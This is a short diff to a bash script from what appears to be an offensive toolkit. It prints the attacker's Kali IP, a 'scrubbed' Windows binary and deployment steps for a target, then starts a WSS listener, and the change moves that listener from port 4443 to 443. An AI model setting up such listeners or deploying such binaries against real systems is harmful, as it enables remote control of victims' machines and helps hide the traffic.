@@ -131,7 +131,7 @@ echo -e "${CYAN}═════════════════════�
 echo ""
 echo -e "  ${YELLOW}Your IP:${NC}          ${KALI_IP}"
 echo -e "  ${YELLOW}Scrubbed binary:${NC}  ${DIR}/ers-w.exe"
-echo -e "  ${YELLOW}Listener port:${NC}    4443"
+echo -e "  ${YELLOW}Listener port:${NC}    443"
 echo ""
 echo -e "  ${CYAN}── DEPLOY TO WINDOWS TARGET ──${NC}"
 echo ""
@@ -154,4 +154,4 @@ echo ""
 banner "Starting WSS listener on port 443..."
 echo ""
 cd "$DIR"
-python3 listener.py 4443
+python3 listener.py 443
